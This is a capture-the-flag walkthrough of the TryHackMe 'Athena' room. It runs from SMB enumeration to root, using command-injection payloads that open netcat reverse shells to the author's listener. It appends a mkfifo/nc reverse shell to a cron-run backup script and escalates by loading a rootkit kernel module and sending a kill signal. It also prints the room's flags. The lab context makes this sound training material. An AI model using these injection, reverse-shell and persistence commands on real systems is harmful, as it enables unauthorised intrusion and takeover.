# Athena :
```sh
export IP=room-ip
```
# Information Gathering: 

nmap -sV -sC -A  $IP
```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-05 00:25 CEST
Nmap scan report for 10.10.155.144
Host is up (0.14s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -33s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-04T22:25:31
|_  start_date: N/A
|_nbstat: NetBIOS name: ROUTERPANEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.53 seconds
```
Now, we have some services that are running in the machine.
# Enumerating this services: 

![Screenshot_22](https://github.com/a-9-k/Rooms-Write_Up-THM/assets/53786047/7c256c8a-fad5-4434-867a-f278095acd9d)

Nothing in Here.

I used a tool called enum4linux for the smb  
```sh
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\ubuntu (Local User)
S-1-22-1-1001 Unix User\athena (Local User)

Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
 
 [+] Attempting to map shares on 10.10.155.144

//10.10.155.144/public	Mapping: OK Listing: OK Writing: N/A
```

By this information i was able to use smbclient to enter the Public share

```sh
smbclient  //10.10.155.144/public
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 17 02:54:43 2023
  ..                                  D        0  Mon Apr 17 02:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 20:59:44 2023
```
So we found text file from the administrator exposing the  dir /myrouterpanel 

```sh
cat msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```
Let’s visit the directory /myrouterpanel.

![Screenshot_23](https://github.com/a-9-k/Rooms-Write_Up-THM/assets/53786047/d010c5af-2dfc-48f3-979d-a6788daab527)

by seeing this ping tool it obvious that we have a command injection vuln
$(ls) !ls ;ls .....
I managed to get this injection to get me a reverse shell 

```sh
127.0.0.1 -c `nc 10.8.46.178 9001 -e /bin/sh`
nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.8.46.178] from (UNKNOWN) [10.10.155.144] 51460
ls
index.html
ping.php
style.css
under-construction.html

```
# stabilize the reverse shell :
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
Press CTRL + Z to background process and get back to your host machine
stty raw -echo; fg
export TERM=xterm
```
Here I used linpeas.sh to enumerate the machine.
```sh
my machine : python3 -m http.server 8000
reverse shell : wget http://vpnIP/linpeas.sh -O linpeas.sh
```
I found this file /usr/share/backup/backup.sh with athena as the owner, so i add revshell to the file bc it has crontab running the sh file.

```sh

-rwxr-xr-x   1 www-data athena     258 May 28  2023 backup.sh

www-data@routerpanel:/usr/share/backup$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.46.178 4444 >/tmp/f'  >> backup.sh
www-data@routerpanel:/usr/share/backup$ cat backup.sh 
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.46.178 4444 >/tmp/f
-----------------------------------------------------------------------------------------------------------------------------------------------------
in my machine
nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.8.46.178] from (UNKNOWN) [10.10.155.144] 60748
/bin/sh: 0: can't access tty; job control turned off
$ id     
uid=1001(athena) gid=1001(athena) groups=1001(athena)
$ cat user.txt
857c4a4fbac638afb6c7ee45eb3e1a28

```
 What we can run as sudo.
```sh
athena@routerpanel:~/notes$ sudo -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User athena may run the following commands on routerpanel:
    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```
# Privilege escalation:

 I decompile the file venom.ko , and  i used chatgpt to understand it so i found that 
```sh
 The code you've provided isn't inherently vulnerable by itself; rather, it's designed to exploit vulnerabilities or weaknesses in the Linux kernel. Let's break down potential vulnerabilities or risks associated with this code:

Kernel Code Modification: The code modifies the behavior of certain system calls by hooking into them. This kind of modification introduces a risk of instability or unintended behavior in the kernel. If the modification is not implemented correctly or conflicts with other parts of the kernel, it could lead to system crashes or security vulnerabilities.

Privilege Escalation: By intercepting the kill system call, the code grants root privileges (give_root) based on specific conditions. If an attacker can trigger these conditions, they may be able to escalate their privileges to root, gaining complete control over the system.
Process Hiding: The code includes functionality (is_invisible) to hide certain processes from being listed by system calls like getdents and getdents64. While this may be used for legitimate purposes, such as hiding sensitive processes, it can also be abused by malware to conceal its presence on the system, making it harder for security tools and administrators to detect.

Kernel Module Loading: The code is implemented as a kernel module (diamorphine_init), which means it can be loaded into the kernel dynamically. Kernel modules have elevated privileges and can interact directly with kernel internals, making them powerful tools for both legitimate and malicious purposes. However, loading unauthorized or malicious kernel modules introduces significant security risks, as they can bypass standard security mechanisms and directly manipulate the kernel.

Lack of Input Validation: The code does not appear to perform extensive input validation, particularly in functions like hacked_getdents and hacked_getdents64, where directory entries are filtered based on specific criteria. Without proper input validation, there's a risk of buffer overflows, out-of-bounds accesses, and other vulnerabilities that could be exploited by attackers to compromise the system.

```
```
# exploited
athena@routerpanel:/mnt/.../secret$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
athena@routerpanel:/mnt/.../secret$ kill -57 0
athena@routerpanel:/mnt/.../secret$ whoami
root
athena@routerpanel:/mnt/.../secret$ cd /root/
athena@routerpanel:/root$ ls
fsociety00.dat  root.txt
athena@routerpanel:/root$ cat root.txt 
aecd4a3497cd2ec4bc71a2315030bd48
```
